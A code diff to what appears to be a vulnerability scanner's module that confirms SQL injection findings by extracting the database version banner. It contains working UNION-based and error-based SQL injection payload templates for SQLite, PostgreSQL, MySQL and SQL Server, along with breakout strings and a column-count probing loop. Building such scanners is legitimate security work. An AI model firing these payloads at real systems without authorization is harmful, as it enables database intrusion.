@@ -84,16 +84,16 @@ def _clean(value: str) -> str:
     return " ".join(printable.split())[:_VALUE_CAP]
 
 
-def _extract_between(text: str, mark: str) -> str | None:
-    """The evaluated value our two markers delimit — or None if it's just our reflected payload."""
-    m = re.search(re.escape(mark) + r"(.+?)" + re.escape(mark), text, re.S)
-    if m is None:
-        return None
-    inner = _clean(m.group(1))
-    lowered = inner.lower()
-    if not inner or mark in inner or any(tok in lowered for tok in _ECHO_MARKERS):
-        return None  # empty, nested, or our own payload echoed back verbatim
-    return inner
+def _extract_between(text: str, left: str, right: str) -> str | None:
+    """The first value our asymmetric delimiters bracket that is *evaluated* output, not our own
+    payload echoed back. Reflecting apps (``Results for {query}``) print the raw payload too, so we
+    scan every ``left…right`` pair and skip the ones that still carry SQL — the reflected literals."""
+    for m in re.finditer(re.escape(left) + r"(.+?)" + re.escape(right), text, re.S):
+        inner = _clean(m.group(1))
+        lowered = inner.lower()
+        if inner and left not in inner and right not in inner and not any(tok in lowered for tok in _ECHO_MARKERS):
+            return inner
+    return None
 
 
 def _dbms_of(banner: str, hint: str) -> str:
@@ -120,21 +120,21 @@ def _proof(banner: str, dbms: str, technique: str) -> str:
     )
 
 
-# UNION dialects: (column-expression template with {m} marker and {v} version fn, version fn, DBMS hint).
+# UNION dialects: (column expr with {l}/{r} delimiters and {v} version fn, version fn, DBMS hint).
 _UNION_PROFILES = [
-    ("'{m}'||{v}||'{m}'", "sqlite_version()", "SQLite"),
-    ("'{m}'||{v}||'{m}'", "version()", "PostgreSQL"),
-    ("CONCAT('{m}',{v},'{m}')", "version()", "MySQL/MariaDB"),
-    ("'{m}'+{v}+'{m}'", "@@version", "Microsoft SQL Server"),
+    ("'{l}'||{v}||'{r}'", "sqlite_version()", "SQLite"),
+    ("'{l}'||{v}||'{r}'", "version()", "PostgreSQL"),
+    ("CONCAT('{l}',{v},'{r}')", "version()", "MySQL/MariaDB"),
+    ("'{l}'+{v}+'{r}'", "@@version", "Microsoft SQL Server"),
 ]
 _BREAKOUTS = [("'", "-- "), ("'", "-- -"), ("'", "#"), ("", "-- ")]
 
-# Error-based one-shots: (expression template with {m} marker, DBMS hint).
+# Error-based one-shots: (expression template with {l}/{r} delimiters, DBMS hint).
 _ERROR_PROFILES = [
-    ("AND extractvalue(1,concat('{m}',version(),'{m}'))", "MySQL/MariaDB"),
-    ("AND updatexml(1,concat('{m}',version(),'{m}'),1)", "MySQL/MariaDB"),
-    ("AND 1=cast(('{m}'||version()||'{m}') as int)", "PostgreSQL"),
-    ("AND 1=convert(int,'{m}'+@@version+'{m}')", "Microsoft SQL Server"),
+    ("AND extractvalue(1,concat('{l}',version(),'{r}'))", "MySQL/MariaDB"),
+    ("AND updatexml(1,concat('{l}',version(),'{r}'),1)", "MySQL/MariaDB"),
+    ("AND 1=cast(('{l}'||version()||'{r}') as int)", "PostgreSQL"),
+    ("AND 1=convert(int,'{l}'+@@version+'{r}')", "Microsoft SQL Server"),
 ]
 
 
@@ -142,14 +142,15 @@ async def _prove_sqli(client: HttpClient, finding: Finding) -> str | None:
     point = finding.injection_point
     if point.location not in _INJECTABLE:
         return None
-    mark = "d" + secrets.token_hex(5)  # alnum delimiter, HTML-safe
+    tok = secrets.token_hex(5)
+    left, right = "dl" + tok, "dr" + tok  # asymmetric, alnum, HTML-safe delimiters
     junk = "zq" + secrets.token_hex(3)  # a LIKE prefix no real row matches, so only our UNION row returns
     budget = _MAX_REQ_PER_FINDING
 
-    # 1) UNION-based: put the marker-wrapped version in every column, widening 1..8 until it lands.
+    # 1) UNION-based: put the delimited version in every column, widening 1..8 until it lands.
     for breakout, comment in _BREAKOUTS:
         for tmpl, version_fn, hint in _UNION_PROFILES:
-            col = tmpl.format(m=mark, v=version_fn)
+            col = tmpl.format(l=left, r=right, v=version_fn)
             for ncols in range(1, 9):
                 if budget <= 0:
                     return None
@@ -159,7 +160,7 @@ async def _prove_sqli(client: HttpClient, finding: Finding) -> str | None:
                 resp = await _send(client, build_mutated_request(point, payload))
                 if resp is None:
                     continue
-                banner = _extract_between(resp.text, mark)
+                banner = _extract_between(resp.text, left, right)
                 if banner:
                     return _proof(banner, _dbms_of(banner, hint), "UNION-based")
 
@@ -169,11 +170,11 @@ async def _prove_sqli(client: HttpClient, finding: Finding) -> str | None:
             if budget <= 0:
                 return None
             budget -= 1
-            payload = f"{junk}{breakout} {tmpl.format(m=mark)}{comment}"
+            payload = f"{junk}{breakout} {tmpl.format(l=left, r=right)}{comment}"
             resp = await _send(client, build_mutated_request(point, payload))
             if resp is None:
                 continue
-            banner = _extract_between(resp.text, mark)
+            banner = _extract_between(resp.text, left, right)
             if banner:
                 return _proof(banner, _dbms_of(banner, hint), "basada en error")
 
